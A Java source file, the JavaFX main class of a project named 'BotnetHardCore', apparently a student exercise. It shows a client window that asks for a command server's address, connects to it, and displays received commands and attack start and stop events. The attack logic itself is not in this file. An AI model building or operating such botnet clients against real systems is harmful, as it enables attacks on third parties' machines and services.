package br.com.client;

import br.com.client.controller.MainController;
import javafx.application.Application;
import javafx.application.Platform;
import javafx.fxml.FXMLLoader;
import javafx.scene.Scene;
import javafx.scene.layout.AnchorPane;
import javafx.scene.layout.BorderPane;
import javafx.stage.Stage;

import javax.swing.*;
import java.io.IOException;
import java.net.UnknownHostException;

/**
 * Project: BotnetHardCore
 * User: Jeferson Machado <jefersonmachado@univille.br>
 * Date: 01/08/2018
 * Time: 20:23
 */
@SuppressWarnings("Duplicates")
public class MainApp extends Application implements ClientCallback {

    private Stage mPrimaryStage;
    private BorderPane mRootLayout;
    private MainController mClientController;
    private Client mClient;

    public static void main(String[] args) {
        launch(args);
    }

    @Override
    public void start(Stage primaryStage) {
        this.mPrimaryStage = primaryStage;
        this.mPrimaryStage.setTitle("BotNet Client");

        primaryStage.setOnCloseRequest(event -> {
            event.consume();
            primaryStage.close();
            Platform.exit();
            System.exit(0);
        });

        initRootLayout();
        loadContent();

        JLabel lblMessage = new JLabel("Server IP:");
        JTextField txtPorta = new JTextField("http://192.168.1.101");
        Object[] texts = {lblMessage, txtPorta};
        JOptionPane.showMessageDialog(null, texts);

        startClient(txtPorta.getText());
    }

    /**
     * Inicializa o root layout (layout base).
     */
    private void initRootLayout() {
        try {
            // Carrega o root layout do arquivo fxml.
            FXMLLoader loader = new FXMLLoader();
            loader.setLocation(MainApp.class.getResource("MainView.fxml"));
            mRootLayout = loader.load();

            // Mostra a scene (cena) contendo o root layout.
            Scene scene = new Scene(mRootLayout);
            mPrimaryStage.setScene(scene);
            mPrimaryStage.show();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    private void loadContent() {
        try {
            FXMLLoader loader = new FXMLLoader();
            loader.setLocation(Client.class.getResource("ContentView.fxml"));
            AnchorPane personOverview = loader.load();

            // Define o person overview dentro do root layout.
            mRootLayout.setCenter(personOverview);

            mClientController = loader.getController();
            mClientController.setMainApp(this);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    private void startClient(String hostname) {
        try {
            mClient = Client.startClient(hostname, this);
        } catch (UnknownHostException e) {
            e.printStackTrace();
        }
    }

    @Override
    public void onCommandReceived(String command) {
        mClientController.addCommand(command);
    }

    @Override
    public void onConnected() {
        mClientController.connected();
    }

    @Override
    public void onDisconnect() {
        mClientController.disconnect();
    }

    @Override
    public void onAttackStarted() {
        mClientController.attackStarted();
    }

    @Override
    public void onAttackStopped() {
        mClientController.attackStopped();
    }
}
